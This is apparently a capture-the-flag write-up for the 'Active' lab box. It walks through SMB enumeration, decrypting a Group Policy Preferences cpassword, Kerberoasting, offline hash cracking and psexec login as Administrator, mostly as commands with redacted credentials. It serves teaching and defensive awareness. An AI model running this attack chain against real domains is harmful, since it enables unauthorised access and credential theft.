# Active (Easy)

Active Directory box built around a classic GPP (Group Policy Preferences) credential leak.

## Enumeration

```bash
nmap -sC -sV -p- <target>
```

```
53/tcp    open  domain        Microsoft DNS 6.1.7601 (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap          (Domain: active.htb)
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  ncacn_http
636/tcp   open  tcpwrapped
3268/tcp  open  ldap
3269/tcp  open  tcpwrapped
```

Anonymous SMB enumeration revealed unusual `Replication` and `Users` shares:

```bash
crackmapexec smb <target> -u '' -p '' --shares
smbclient //<target>/Replication
```

## Foothold — GPP cpassword

Inside the `Replication` share, a `Groups.xml` file (SYSVOL Group Policy Preferences) contained an encrypted `cpassword` attribute for a service account.

```bash
gpp-decrypt -f groups.xml
```

GPP uses a well-known, published AES key, so any `cpassword` found in SYSVOL can be decrypted instantly — this is why GPP password storage is deprecated. Credentials recovered here are redacted (`<REDACTED>`).

```bash
smbmap -d active.htb -u <user> -p <REDACTED> -H <target>
smbclient //<target>/Users -U <user>
```
→ `user.txt` retrieved from the decrypted account's desktop.

## Privilege Escalation — Kerberoasting

With a standard domain user, roast SPN accounts:

```bash
GetUserSPNs.py -dc-ip <target> active.htb/<user>:<REDACTED> -stealth
GetUserSPNs.py -dc-ip <target> active.htb/<user>:<REDACTED> -request
```

Crack the TGS-REP hash offline:

```bash
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

The cracked Administrator password is redacted. Authenticate:

```bash
psexec.py active.htb/administrator:<REDACTED>@<target>
```

## Takeaways

- Never store credentials in GPP — the decryption key is public.
- Service accounts should use long, random passwords immune to Kerberoasting.
